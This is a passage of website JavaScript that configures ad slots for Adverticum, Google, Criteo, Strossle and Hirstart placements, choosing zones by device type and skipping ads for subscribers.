(gadxDiv.getAttribute(\\"ctsStyle\\") != null) {                    gadxDiv.style = gadxDiv.getAttribute(\\"ctsStyle\\");                    gadxDiv.removeAttribute(\\"ctsStyle\\");                } else {                    gadxDiv.removeAttribute(\\"style\\");                }                gadxDiv.appendChild(advParts.initScript);                gadxDiv.appendChild(advParts.body);                (adsbygoogle = window.adsbygoogle || []).push({});                gadxDiv.removeAttribute(\'id\');            } else {                var adxElement = document.getElementById(\'ctsGadxTemp\');                adxElement.parentNode.removeChild(adxElement);            }        })();    </script></div>\"}, {\"service_name\": \"Google Adverts\", \"weight\": null, \"source\": \"<div id=\\"article_recommender_pad_mpx_placeholder\\" class=\\"_ce_measure_widget _ce_measure_appear\\"    data-ce-measure-widget=\\"article_recommender{pad,mpx}\\" data-ce-measure-appear=\\"article_recommender{pad,mpx}\\"    style=\\"display:none;\\"><div id=\\"article_recommender_pad_placeholder1\\"></div><div id=\\"article_recommender_mpx_placeholder\\" class=\\"ctsGadx\\" ctsStyle=\\"display:block;${multiplex_css}\\"></div><div id=\\"article_recommender_pad_placeholder2\\"></div></div><div id=\\"tempAdScript\\"><script>        (function () {            const insertPAD = (index, selector) => {                try {                    let src = \'\',                        insertedElement = document.querySelector(selector),                        style = \'${rss_css_multiple}\' != \'\' ? JSON.parse(\'${rss_css_multiple}\')[index] : \'\';                    insertedElement.removeAttribute(\'id\');                    if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                        switch (_ceDeviceDetect.getDeviceType()) {                            case \'desktop\':                                src = JSON.parse(\'[\\"//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1539\\", \\"//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1540\\"]\')[index];                                break;                            case \'mobile\':                                src = JSON.parse(\'[\\"//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1539\\", \\"//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1540\\"]\')[index];                                break;                            case \'tablet\':                                src = JSON.parse(\'[\\"//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1539\\", \\"//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1540\\"]\')[index];                                break;                        }                    }                    if (src != \'\') {                        const pid = src.match(/pid=(\\\\d+)/)[1];                        const id = src.match(/&id=(\\\\d+)/)[1];                        if (style != null && style != \'\') insertedElement.style = style;                        insertedElement.id = \\"hirstartbox-\\" + pid + \\"-\\" + id;                        insertedElement.style.display = \\"block\\";                        const s = document.createElement(\\"script\\");                        s.type = \\"text/javascript\\";                        s.async = true;                        s.src = src;                        document.getElementsByTagName(\\"head\\")[0].appendChild(s);                    } else {                        insertedElement.parentNode.removeChild(insertedElement);                    }                } catch (e) {                }            };            const insertMultiplex = (selector) => {                let slotForDevice = {                    desktop: \'7533806289\',                    mobile: \'7818642433\',                    tablet: \'7818642433\'                },                    slotForDeviceDark = {                        desktop: \'${google_adsense_content_recommendation_dark}\',                        mobile: \'${google_adsense_content_recommendation_mobile_dark}\',                        tablet: \'${google_adsense_content_recommendation_mobile_dark}\'                    },                    recommDiv = document.querySelector(selector),                    slot = \'\',                    parameter = \'\',                    googleUniqueParameters = {                        desktop: \'{\\"data-matched-content-rows-num\\": \\"1\\", \\"data-matched-content-columns-num\\": \\"4\\", \\"data-matched-content-ui-type\\": \\"image_stacked\\"}\',                        mobile: \'{\\"data-matched-content-rows-num\\": \\"4\\", \\"data-matched-content-columns-num\\": \\"1\\", \\"data-matched-content-ui-type\\": \\"image_sidebyside\\"}\',                        tablet: \'{\\"data-matched-content-rows-num\\": \\"4\\", \\"data-matched-content-columns-num\\": \\"1\\", \\"data-matched-content-ui-type\\": \\"image_sidebyside\\"}\'                    },                    isSubscribed = false;                recommDiv.removeAttribute(\\"id\\");                if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                    isSubscribed = true;                }                if (typeof _ceCTSData != \'undefined\' && _ceCTSData.darkMode != undefined && _ceCTSData.darkMode) {                    slotForDevice = slotForDeviceDark;                }                if (typeof localStorage.A42A6Cblck != \'undefined\' && JSON.parse(localStorage.A42A6Cblck).bl == 1) {                    recommDiv.parentNode.removeChild(recommDiv);                } else {                    if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                        switch (_ceDeviceDetect.getDeviceType()) {                            case \'desktop\':                                slot = slotForDevice.desktop;                                parameter = googleUniqueParameters.desktop;                                break;                            case \'mobile\':                                slot = slotForDevice.mobile;                                parameter = googleUniqueParameters.mobile;                                if (slot == \'\') {                                    slot = slotForDevice.desktop;                                }                                break;                            case \'tablet\':                                slot = slotForDevice.mobile;                                parameter = googleUniqueParameters.mobile;                                if (slot == \'\') {                                    slot = slotForDevice.desktop;                                }                                break;                        }                    }                    if (!isSubscribed && (typeof noADX == \'undefined\' || noADX === false) && slot != \'\') {                        let advParts = {};                        advParts.initScript = document.createElement(\'script\');                        advParts.initScript.src = \'//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\';                        advParts.initScript.async = \'true\';                        advParts.body = document.createElement(\'ins\');                        advParts.body.className = \'adsbygoogle\';                        advParts.body.style.display = \'block\';                        advParts.body.setAttribute(\'data-ad-format\', \'autorelaxed\');                        advParts.body.setAttribute(\'data-ad-client\', \'ca-pub-8962558862962174\');                        advParts.body.setAttribute(\'data-ad-slot\', slot);                        try {                            parameter = JSON.parse(parameter);                            for (let key in parameter) {                                if (parameter.hasOwnProperty(key)) {                                    advParts.body.setAttribute(key, parameter[key]);                                }                            }                        } catch (e) {                        }                        if (recommDiv.getAttribute(\\"ctsStyle\\") != null) {                            recommDiv.style = recommDiv.getAttribute(\\"ctsStyle\\");                            recommDiv.removeAttribute(\\"ctsStyle\\");                        } else {                            recommDiv.removeAttribute(\\"style\\");                        }                        recommDiv.appendChild(advParts.initScript);                        recommDiv.appendChild(advParts.body);                        (adsbygoogle = window.adsbygoogle || []).push({});                        recommDiv.removeAttribute(\'id\');                    } else {                        recommDiv.parentNode.removeChild(recommDiv);                    }                }            };            const scriptPlaceholder = document.querySelector(\\"#tempAdScript\\");            const placeholder = document.querySelector(\\"#article_recommender_pad_mpx_placeholder\\");            placeholder.removeAttribute(\\"id\\");            placeholder.style.display = \\"block\\";            insertPAD(0, \'#article_recommender_pad_placeholder1\');            insertMultiplex(\'#article_recommender_mpx_placeholder\');            insertPAD(1, \'#article_recommender_pad_placeholder2\');            scriptPlaceholder.parentNode.removeChild(scriptPlaceholder);        })();    </script></div>\"}, {\"service_name\": \"Strossle\", \"weight\": null, \"source\": \"<div id=\\"strossle-widget-widget-5bc0a58c37ef6\\" class=\\"wpb_widget _ce_measure_widget _ce_measure_appear\\"    data-ce-measure-widget=\\"article_recommender{strossle,adblock}\\" data-ce-measure-appear=\\"article_recommender{strossle,adblock}\\" style=\\"display: none;\\"><script type=\\"text/javascript\\">        (function () {            var strossle_element = document.getElementById(\\"strossle-widget-widget-5bc0a58c37ef6\\");            var strossle_exceptions = \'${strossle_widget_exceptions}\';            strossle_exceptions = strossle_exceptions.replace(\\" \\", \\"\\");            strossle_exceptions = strossle_exceptions.split(\\",\\");            var strossle_enabled = true;            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (strossle_exceptions != \\"\\") {                for (var i = 0; i < strossle_exceptions.length; i++) {                    if (window.location.search.indexOf(strossle_exceptions[i]) != -1) {                        strossle_enabled = false;                        strossle_element.remove();                    }                }            }            if (!isSubscribed && strossle_enabled && (typeof localStorage.A42A6Cblck != \'undefined\' && JSON.parse(localStorage.A42A6Cblck).bl == 1)) {                strossle_element.setAttribute(\\"data-spklw-widget\\", \\"widget-5bc0a58c37ef6\\");                if (strossle_element.getAttribute(\\"ctsStyle\\") != null) {                    strossle_element.style = strossle_element.getAttribute(\\"ctsStyle\\");                    strossle_element.removeAttribute(\\"ctsStyle\\");                } else {                    strossle_element.removeAttribute(\\"style\\");                }                strossle_element.setAttribute(\\"style\\", \\"${strossle_style}\\");            } else {                strossle_element.remove();            }        })();    </script></div>\"}]';
  this.positions_weighted['content-article-end'] = false;
  this.positions['content010'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5043027\';                        dataAdsvName = \'roadblock\';                        break;                    case \'mobile\':                        zoneForDevice = \'5043066\';                        dataAdsvName = \'mobil_waterfall1\';                        break;                    case \'tablet\':                        zoneForDevice = \'5043027\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'roadblock\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<div id=\\"criteoTPL\\" ctsStyle=\\"width:0px;height:0px;margin:0 auto;overflow:hidden;${custom_css}\\" style=\\"display: none;\\"></div><script type=\\"text/javascript\\">    (function () {        var zoneid = 1470408,            height = 250,            width = 300,            criteoEl = document.getElementById(\\"criteoTPL\\"),            domReady = \\"${criteo_dom_ready}\\",            mutationTimeout = 5000,            mutationConf = { attributes: true, childList: true, subtree: true },            isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        var insertCriteoBanner = function () {            if (!isSubscribed) {                criteoEl.id += Math.floor(Math.random() * 1000000);                if (criteoEl.getAttribute(\\"ctsStyle\\") != null) {                    criteoEl.style = criteoEl.getAttribute(\\"ctsStyle\\");                    criteoEl.removeAttribute(\\"ctsStyle\\");                } else {                    criteoEl.removeAttribute(\\"style\\");                }                var observer = new MutationObserver(function (mutations) {                    mutations.forEach(function () {                        criteoEl.style.width = width + \\"px\\";                        criteoEl.style.height = height + \\"px\\";                        criteoEl.style.marginTop = \\"10px\\";                        criteoEl.style.marginBottom = \\"10px\\";                        observer.disconnect();                    });                });                observer.observe(criteoEl, mutationConf);                setTimeout(function () { observer.disconnect(); }, mutationTimeout);                Criteo.events.push(function () {                    Criteo.DisplayAcceptableAdIfAdblocked({                        \\"zoneid\\": zoneid,                        \\"containerid\\": criteoEl.id,                        \\"overrideZoneFloor\\": true                    });                });            } else {                criteoEl.parentNode.removeChild(criteoEl);            }        };        if (domReady != undefined && domReady != \'\' && domReady) {            if (typeof document.addEventListener !== \'undefined\') {                document.addEventListener(\\"DOMContentLoaded\\", insertCriteoBanner);            } else {                window.attachEvent(\\"onload\\", insertCriteoBanner);            }        } else {            insertCriteoBanner();        }    })();</script>\"}]';
  this.positions_weighted['content010'] = false;
  this.positions['content020'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'6343782\';                        dataAdsvName = \'roadblock2\';                        break;                    case \'mobile\':                        zoneForDevice = \'6343784\';                        dataAdsvName = \'mobil_waterfall3\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'roadblock2\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['content020'] = false;
  this.positions['content030'] = '[]';
  this.positions_weighted['content030'] = false;
  this.positions['content040'] = '[]';
  this.positions_weighted['content040'] = false;
  this.positions['content050'] = '[]';
  this.positions_weighted['content050'] = false;
  this.positions['content060'] = '[{\"service_name\": \"Sanoma/Hirstart\", \"weight\": null, \"source\": \"<div id=\'hirstart_rss_partner_box\' class=\\"_ce_measure_widget _ce_measure_appear\\"    data-ce-measure-widget=\\"article_recommender{pad}\\" data-ce-measure-appear=\\"article_recommender{pad}\\"    style=\\"margin-top: -80px;\\"></div><script>    (function () {        let src = \'\',            insertedElement = document.getElementById(\'hirstart_rss_partner_box\'),            cntMultipledRecomm = document.querySelectorAll(\\"#hirstartbox-8-1420\\").length;        if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {            switch (_ceDeviceDetect.getDeviceType()) {                case \'desktop\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1420\\";\';                    break;                case \'mobile\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1420\';                    break;                case \'tablet\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1420\\";\';                    break;            }        }        if (src != \'\' && cntMultipledRecomm == 0) {            insertedElement.id = \\"hirstartbox-8-1420\\";            const s = document.createElement(\\"script\\");            s.type = \\"text/javascript\\";            s.async = true;            s.src = src;            document.getElementsByTagName(\\"head\\")[0].appendChild(s);        } else {            insertedElement.parentNode.removeChild(insertedElement);        }    })();</script>\"}, {\"service_name\": \"Google Adverts\", \"weight\": null, \"source\": \"<div id=\\"ce-gpt-emptyslot\\" class=\\"ce-gpt-slot-parent\\"    ctsStyle=\\"display:table;margin:0 auto;text-align:center;width:100%;margin-top: 15px; margin-bottom: 15px;margin-top: 30px; margin-bottom: -30px;\\" style=\\"display: none;\\"><script>        (function () {            var gptAccountId = \\"52203547\\" || 6355419,                thisGptSlot = document.getElementById(\'ce-gpt-emptyslot\'),                isSubscribed = false,                defaultGptStyle = \\"display:table;margin:0 auto;text-align:center;\\",                gptNum = 1,                slotData = {                    name: {                        desktop: \'[\\"nosalty_cikkajanlo_bal\\",\\"nosalty_cikkajanlo_jobb\\"]\' || \'\',                        mobile: \'[\\"nosalty_mobil_cikkajanlo\\"]\' || \'\',                        tablet: \'${google_gpt_tablet_slot_name}\' || \'\',                        val: \'\',                    },                    size: {                        desktop: \'[[300,250],[300,250]]\' || \'\',                        mobile: \'[[[336, 280], [300, 250]]]\' || \'\',                        tablet: \'[[300,250],[300,250]]\' || \'\',                        val: \'\'                    }                };            thisGptSlot.removeAttribute(\'id\');            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            var insertGpt = function (cnt) {                var newSlotEl = document.createElement(\'div\');                var style = \'${google_gpt_style}\' != undefined && \'${google_gpt_style}\' != \'\' ? JSON.parse(\'${google_gpt_style}\')[cnt] : \'\';                newSlotEl.id = \'ce-gpt-slot\' + Math.floor(Math.random() * 1000000000000);                newSlotEl.className = \'ce-gpt-slot\';                newSlotEl.setAttribute(\\"ctsStyle\\", style);                newSlotEl.style = defaultGptStyle;                thisGptSlot.appendChild(newSlotEl);                if (!isSubscribed && window.googletag && window.googletag.cmd && slotData.name.val[cnt] != undefined && slotData.name.val[cnt] != \'\' && slotData.size.val[cnt] != undefined && slotData.size.val[cnt] != \'\') {                    if (gptNum > 1) defaultGptStyle += cnt == 0 ? \'float:left;\' : \'float:right\';                    if (newSlotEl.getAttribute(\\"ctsStyle\\") != null) {                        newSlotEl.style = defaultGptStyle + newSlotEl.getAttribute(\\"ctsStyle\\");                        newSlotEl.removeAttribute(\\"ctsStyle\\");                    } else {                        newSlotEl.removeAttribute(\\"style\\");                    }                    if (thisGptSlot.getAttribute(\\"ctsStyle\\") != null) {                        thisGptSlot.style = thisGptSlot.getAttribute(\\"ctsStyle\\");                        thisGptSlot.removeAttribute(\\"ctsStyle\\");                    }                    googletag.cmd.push(function () {                        googletag.defineSlot(\'/\' + gptAccountId + \'/\' + slotData.name.val[cnt], slotData.size.val[cnt], newSlotEl.id).addService(googletag.pubads());                    });                } else {                    try {                        thisGptSlot.parentNode.removeChild(thisGptSlot);                    } catch (e) { }                }            };            if (                (typeof noADX == \'undefined\' || noADX === false) && typeof _ceDeviceDetect != \'unedfined\' &&                typeof _ceDeviceDetect.getDeviceType == \'function\'            ) {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        slotData.name.val = slotData.name.desktop;                        slotData.size.val = slotData.size.desktop;                        break;                    case \'mobile\':                        slotData.name.val = slotData.name.mobile;                        slotData.size.val = slotData.size.mobile;                        break;                    case \'tablet\':                        if (slotData.name.tablet != \'\' && slotData.size.tablet != \'\') {                            slotData.name.val = slotData.name.tablet;                            slotData.size.val = slotData.size.tablet;                        } else {                            slotData.name.val = slotData.name.desktop;                            slotData.size.val = slotData.size.desktop;                        }                        break;                }                if (slotData.size.val != \'\' && slotData.name.val != \'\') {                    slotData.name.val = JSON.parse(slotData.name.val);                    slotData.size.val = JSON.parse(slotData.size.val);                }                if (slotData.size.val != undefined && slotData.size.val != \'\') {                    gptNum = slotData.size.val.length;                    for (var i = 0; i < slotData.size.val.length; i++) {                        insertGpt(i);                    }                }            }        })();    </script></div>\"}]';
  this.positions_weighted['content060'] = false;
  this.positions['content070'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'${adv_zone_id_for_desktop}\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'5043083\';                        dataAdsvName = \'mobil_waterfall2\';                        break;                    case \'tablet\':                        zoneForDevice = \'5043083\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['content070'] = false;
  this.positions['content080'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'6241302\';                        dataAdsvName = \'roadblock3\';                        break;                    case \'mobile\':                        zoneForDevice = \'6040801\';                        dataAdsvName = \'mobil_waterfall3\';                        break;                    case \'tablet\':                        zoneForDevice = \'6040801\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'roadblock3\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<div id=\\"criteoTPL\\" ctsStyle=\\"width:0px;height:0px;margin:0 auto;overflow:hidden;${custom_css}\\" style=\\"display: none;\\"></div><script type=\\"text/javascript\\">    (function () {        var zoneid = 1470404,            height = 360,            width = 640,            criteoEl = document.getElementById(\\"criteoTPL\\"),            domReady = \\"${criteo_dom_ready}\\",            mutationTimeout = 5000,            mutationConf = { attributes: true, childList: true, subtree: true },            isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        var insertCriteoBanner = function () {            if (!isSubscribed) {                criteoEl.id += Math.floor(Math.random() * 1000000);                if (criteoEl.getAttribute(\\"ctsStyle\\") != null) {                    criteoEl.style = criteoEl.getAttribute(\\"ctsStyle\\");                    criteoEl.removeAttribute(\\"ctsStyle\\");                } else {                    criteoEl.removeAttribute(\\"style\\");                }                var observer = new MutationObserver(function (mutations) {                    mutations.forEach(function () {                        criteoEl.style.width = width + \\"px\\";                        criteoEl.style.height = height + \\"px\\";                        criteoEl.style.marginTop = \\"10px\\";                        criteoEl.style.marginBottom = \\"10px\\";                        observer.disconnect();                    });                });                observer.observe(criteoEl, mutationConf);                setTimeout(function () { observer.disconnect(); }, mutationTimeout);                Criteo.events.push(function () {                    Criteo.DisplayAcceptableAdIfAdblocked({                        \\"zoneid\\": zoneid,                        \\"containerid\\": criteoEl.id,                        \\"overrideZoneFloor\\": true                    });                });            } else {                criteoEl.parentNode.removeChild(criteoEl);            }        };        if (domReady != undefined && domReady != \'\' && domReady) {            if (typeof document.addEventListener !== \'undefined\') {                document.addEventListener(\\"DOMContentLoaded\\", insertCriteoBanner);            } else {                window.attachEvent(\\"onload\\", insertCriteoBanner);            }        } else {            insertCriteoBanner();        }    })();</script>\"}]';
  this.positions_weighted['content080'] = false;
  this.positions['content090'] = '[]';
  this.positions_weighted['content090'] = false;
  this.positions['content100'] = '[]';
  this.positions_weighted['content100'] = false;
  this.positions['content110'] = '[]';
  this.positions_weighted['content110'] = false;
  this.positions['content120'] = '[]';
  this.positions_weighted['content120'] = false;
  this.positions['content130'] = '[]';
  this.positions_weighted['content130'] = false;
  this.positions['block-roadblock010'] = '[]';
  this.positions_weighted['block-roadblock010'] = false;
  this.positions['block-roadblock020'] = '[]';
  this.positions_weighted['block-roadblock020'] = false;
  this.positions['block-roadblock030'] = '[]';
  this.positions_weighted['block-roadblock030'] = false;
  this.positions['block-roadblock040'] = '[]';
  this.positions_weighted['block-roadblock040'] = false;
  this.positions['gallery-content010'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ajaxZoneTemp\\" class=\\"a8a263be\\" data-adsv-name=\\"\\" ctsStyle=\\"${custom_css}\\" style=\\"display: none;\\"></div><script>    (function () {        const insertedElement = document.getElementById(\'ajaxZoneTemp\');        const randSlotStr = \'_\' + Math.round(Math.random() * 9999999);        insertedElement.id += randSlotStr;        window.goAdverticum3.onReady((goa3) => {            const $ = goa3.getjQuery();            let zoneForDevice = \'\';            let dataAdsvName = \'\';            let isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (window._ceDeviceDetect != undefined && typeof window._ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (window._ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'7231805\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'${adv_zone_id_for_mobile}\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\' || \'7231805\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'ajaxZone\' + zoneForDevice + randSlotStr;                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }                $(\'#\' + insertedElement.id).goa(zoneForDevice, {                    p: 100, zP: \\"\\", fP: \\"\\", cT: \\"\\"                });            }        });    })();</script>\"}]';
  this.positions_weighted['gallery-content010'] = false;
  this.positions['gallery-content020'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ajaxZoneTemp\\" class=\\"a8a263be\\" data-adsv-name=\\"\\" ctsStyle=\\"${custom_css}\\" style=\\"display: none;\\"></div><script>    (function () {        const insertedElement = document.getElementById(\'ajaxZoneTemp\');        const randSlotStr = \'_\' + Math.round(Math.random() * 9999999);        insertedElement.id += randSlotStr;        window.goAdverticum3.onReady((goa3) => {            const $ = goa3.getjQuery();            let zoneForDevice = \'\';            let dataAdsvName = \'\';            let isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (window._ceDeviceDetect != undefined && typeof window._ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (window._ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'7183160\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'7192833\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\' || \'7183160\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'ajaxZone\' + zoneForDevice + randSlotStr;                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }                $(\'#\' + insertedElement.id).goa(zoneForDevice, {                    p: 100, zP: \\"\\", fP: \\"\\", cT: \\"\\"                });            }        });    })();</script>\"}]';
  this.positions_weighted['gallery-content020'] = false;
  this.positions['gallery-content030'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ajaxZoneTemp\\" class=\\"a8a263be\\" data-adsv-name=\\"\\" ctsStyle=\\"${custom_css}\\" style=\\"display: none;\\"></div><script>    (function () {        const insertedElement = document.getElementById(\'ajaxZoneTemp\');        const randSlotStr = \'_\' + Math.round(Math.random() * 9999999);        insertedElement.id += randSlotStr;        window.goAdverticum3.onReady((goa3) => {            const $ = goa3.getjQuery();            let zoneForDevice = \'\';            let dataAdsvName = \'\';            let isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (window._ceDeviceDetect != undefined && typeof window._ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (window._ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'7201012\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'7201010\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\' || \'7201012\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if 